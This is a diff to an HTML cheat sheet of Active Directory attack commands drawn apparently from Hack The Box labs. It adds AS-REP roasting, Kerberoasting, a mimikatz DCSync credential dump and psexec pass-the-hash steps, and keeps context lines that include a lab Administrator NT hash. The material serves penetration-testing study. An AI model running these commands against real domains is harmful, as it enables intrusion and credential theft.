@@ -41,8 +41,6 @@
                 <p>User enumeration</p>
                 <pre><code class="language-bash">kerbrute userenum --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/usernames.txt </code></pre>
 
-                
-
                 <h3> BloodHound </h3>
                 <p> Utility to gather more information when a <b>user and password have been gathered</b></p>
                 <pre><code class="language-bash">bloodhound-python --dns-tcp -ns TARGET_IP -d DOMAIN -u 'USER' -p 'PASS' -c all</code></pre>
@@ -116,8 +114,43 @@
                     <p>Use the certificate obtained to authenticate in the server and get NT hash</p>
                     <pre><code class="language-bash">certipy auth -pfx administrator_administrator.pfx -domain sequel.htb</code></pre>
                     <p>Authenticate using evilwinrm using the NT hash obtained </p>
-                    <pre><code class="language-power">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
-                </ul>    
+                    <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
+                </ul>
+
+
+                <h3>AS-REP Roasting Attack</h3>
+                <ul>
+                    <p>Request hashes of AD accounts that have enabled the flag "Do not requiere Kerberos preauthentication". In that case an attacker can request a kerberos ticket without having the password for the user</p>
+                    <pre><code class="language-bash"> impacket-GetNPUsers -no-pass -usersfile users.txt DOMAIN.LOCAL</code></pre>
+                    <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
+                    <pre><code class="language-bash">hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+                    <p>Show the hash</p>
+                    <pre><code class="language-bash">hashcat --show -m 18200 hash</code></pre>  
+                </ul>
+
+                <h3>Kerberoasting Attack</h3>
+                <ul>
+                    <p>Allows an authenticated attacker to acquire tickets TGS of service accounts in the domain.</p>
+                    <pre><code class="language-bash"> impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request</code></pre>
+                    <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
+                    <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+                    <p>Show the hash</p>
+                    <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>  
+                </ul>
+
+                <h3>Dsync Attack</h3>
+                <ul>
+                    <p>Having in mind that DCs replicate their data using the protocol of AD replication we can take advantage of this function using a DCsync attack. Must have the following privileges over the domain</p>
+                    <ul>
+                        <li>GetChanges</li>
+                        <li>GetChangesAll</li>
+                    </ul>
+                    <p>Upload mimikatz to the victim server and execute the following command. In case you are in powershell use the " since the software begins to loop if not using it</p>
+                    <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
+                    <pre><code class="language-powershell">.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator exit"</code></pre>
+                    <p>Capture the has NTLM and usit to pass the hash in psexec</p>
+                    <pre><code class="language-bash">impacket-psexec -hashes :HASH DOMAIN.LOCAL/Administrator@TARGET_IP</code></pre>  
+                </ul>
             </ul>        
         </div>
     </div>
